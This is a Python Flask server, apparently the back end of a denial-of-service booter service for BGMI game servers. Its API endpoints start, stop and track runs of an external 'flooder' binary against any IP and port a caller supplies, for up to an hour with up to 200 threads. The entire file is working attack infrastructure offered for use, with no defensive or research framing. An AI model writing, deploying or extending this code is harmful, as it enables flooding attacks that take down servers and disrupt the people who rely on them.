#!/usr/bin/env python3
"""
BGMI Attack API Server
POST /start-server  → launch C++ flooder
POST /stop-server   → stop attack
GET  /health        → status
"""
from flask import Flask, request, jsonify
import subprocess
import threading
import time
import os

app = Flask(__name__)

API_KEY = os.environ.get("ATTACK_API_KEY", "changeme-set-this-env")
FLOODER = os.path.join(os.path.dirname(__file__), "flooder")

# { attack_id: {"proc": Popen, "target": "ip:port", "expires": float} }
active = {}
lock   = threading.Lock()

def cleanup_expired():
    while True:
        time.sleep(10)
        now = time.time()
        with lock:
            for aid in list(active.keys()):
                if active[aid]["expires"] < now:
                    try: active[aid]["proc"].kill()
                    except: pass
                    del active[aid]

threading.Thread(target=cleanup_expired, daemon=True).start()

def auth(req):
    return req.headers.get("x-api-key", "") == API_KEY

# ── /start-server ──────────────────────────────────────────────────
@app.route("/start-server", methods=["POST"])
def start_server():
    if not auth(request):
        return jsonify({"launched": 0, "error": "unauthorized"}), 401

    d        = request.get_json(force=True) or {}
    ip       = str(d.get("param1") or d.get("ip", ""))
    port     = int(d.get("param2") or d.get("port", 0))
    duration = int(d.get("param3") or d.get("duration", 60))
    threads  = int(d.get("threads", 50))

    if not ip or port < 1 or port > 65535:
        return jsonify({"launched": 0, "error": "invalid ip/port"}), 400

    if duration > 3600: duration = 3600
    if threads  > 200:  threads  = 200

    if not os.path.isfile(FLOODER):
        return jsonify({"launched": 0, "error": "flooder binary missing"}), 500

    try:
        proc = subprocess.Popen(
            [FLOODER, ip, str(port), str(duration), str(threads)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
    except Exception as e:
        return jsonify({"launched": 0, "error": str(e)}), 500

    attack_id = f"{ip}:{port}:{int(time.time())}"
    with lock:
        active[attack_id] = {
            "proc":    proc,
            "target":  f"{ip}:{port}",
            "expires": time.time() + duration + 5
        }

    return jsonify({
        "launched":   1,
        "total":      len(active),
        "attack_id":  attack_id,
        "target":     f"{ip}:{port}",
        "duration":   duration,
        "threads":    threads
    })

# ── /stop-server ───────────────────────────────────────────────────
@app.route("/stop-server", methods=["POST"])
def stop_server():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 401

    d    = request.get_json(force=True) or {}
    ip   = str(d.get("param1") or d.get("ip", ""))
    port = str(d.get("param2") or d.get("port", ""))

    stopped = 0
    with lock:
        for aid in list(active.keys()):
            if ip in aid and str(port) in aid:
                try: active[aid]["proc"].kill()
                except: pass
                del active[aid]
                stopped += 1

    return jsonify({"stopped": stopped, "remaining": len(active)})

# ── /health ────────────────────────────────────────────────────────
@app.route("/health", methods=["GET"])
def health():
    with lock:
        attacks = [
            {"id": aid, "target": v["target"],
             "expires_in": max(0, int(v["expires"] - time.time()))}
            for aid, v in active.items()
        ]
    return jsonify({
        "status":         "ok",
        "active_attacks": len(attacks),
        "attacks":        attacks,
        "binary_ready":   os.path.isfile(FLOODER)
    })

if __name__ == "__main__":
    PORT = int(os.environ.get("PORT", 8080))
    print(f"[*] BGMI Attack Server on :{PORT}")
    print(f"[*] API Key: {API_KEY}")
    print(f"[*] Flooder binary: {FLOODER} | exists={os.path.isfile(FLOODER)}")
    app.run(host="0.0.0.0", port=PORT, threaded=True)
